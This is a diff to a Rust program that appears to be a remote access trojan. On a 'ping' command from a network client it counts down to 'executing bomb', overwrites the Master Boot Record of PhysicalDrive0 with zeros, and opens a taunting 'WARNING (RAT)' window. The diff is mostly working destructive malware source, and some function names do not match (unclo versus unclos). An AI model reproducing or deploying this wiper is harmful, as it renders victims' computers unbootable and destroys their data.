@@ -24,10 +24,11 @@ async fn handle_client(mut stream: TcpStream) {
         match command {
             "ping" => {
                 for i in (1..11).rev() {
-                    stream.write(format!("ping received, executing in {}", i).as_bytes()).await.unwrap();
+                    stream.write(format!("ping received, executing bomb in {}", i).as_bytes()).await.unwrap();
                     tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                 }
                 stream.write(b"loading...").await.unwrap();
+                unclo(); // Call the unclose a ble? GUI window
                 mbr_overwrite(); // Call the MBR overwrite function here
                 stream.write(b"target destroyed?").await.unwrap();
             }
@@ -41,24 +42,19 @@ async fn handle_client(mut stream: TcpStream) {
 }
 
 fn mbr_overwrite() {
-    // Create a handle to the physical drive
     let h_device = CreateFileW("\\\\.\\PhysicalDrive0", 0x40000000, 0, std::ptr::null_mut(), 3, 0, std::ptr::null_mut());
 
-    // Overwrite the MBR
     let mut buffer = [0; 512];
     WriteFile(h_device, buffer.as_mut_ptr() as LPVOID, 512, std::ptr::null_mut(), std::ptr::null_mut());
 
-    // Close the handle
     CloseHandle(h_device);
 }
 
-// Optional GUI window function
-fn create_gui_window() {
-    // Create a GUI window using tk-rs
+fn unclos() {
     let mut window = tk::Window::new();
     window.set_title("WARNING (RAT)");
     window.set_geometry("300x200");
     let label = tk::Label::new(&window, "Your computer has been affected by a Remote RAT! Good luck lol <3");
     label.pack();
     window.mainloop();
-}
+} // 60 lines!
